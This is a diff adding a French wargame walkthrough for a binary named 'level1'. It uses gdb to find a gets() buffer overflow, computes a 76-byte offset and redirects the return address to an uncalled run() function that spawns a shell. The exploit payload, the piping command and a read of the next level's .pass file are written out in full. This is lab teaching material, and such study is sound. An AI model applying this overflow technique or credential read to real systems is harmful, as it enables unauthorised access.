@@ -1,1 +1,37 @@
-x
+gdb level1
+info functions
+
+On voit deux fonctions : run et main
+disas main
+Dans le main la fonction run() n'est pas appelee. Par contre y'a une fonction gets()
+qui lit sur stdin.
+
+disas run
+Dans run() on voit un fwrite() mais surtout un system() qui lance un /bin/shm surement avec les droits level02.
+
+
+Il faut donc reussir a aller dans la fonction run qui n'est pas appelee dans le main.
+Pour ca on va changer l'adresse du RET (return) du main pour pointer sur l'adresse de run()
+
+Il faut donc trouver l'offset (nombre d'octets entre le buffer de gets() et le RET) :
+# python -c "print(''.join(chr(i)*4 for i in range(65,90)))"
+copier la string (AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY)
+gdb level1
+run
+coller la string
+voir le eip avec info registers eip
+regarder l'adresse de eip et voir a quelle lettre il crash (ici a 0x54, donc la lettre T car T = 54 en hex)
+On peut donc calculer l'offset, il y a 19 lettres avant le T donc 19*4 = 76 octets entre le buffer et le RET.
+
+Il faut maintenant pointer sur run :
+info functions
+prendre adresse de run (0x08048444  run)
+
+Ensuite, on rempli de 76 caracteres puis on met l'adresse de run a la fin en inversee (Little edian) :
+# python -c "print('A'*76 + '\x44\x84\x04\x08')" > /tmp/truc
+# cat /tmp/truc - | ./level1 (ne pas oublier le - apres le fichier, pour que cat attende une autre entree stdin)
+# cat /home/user/level2/.pass
+
+
+
+
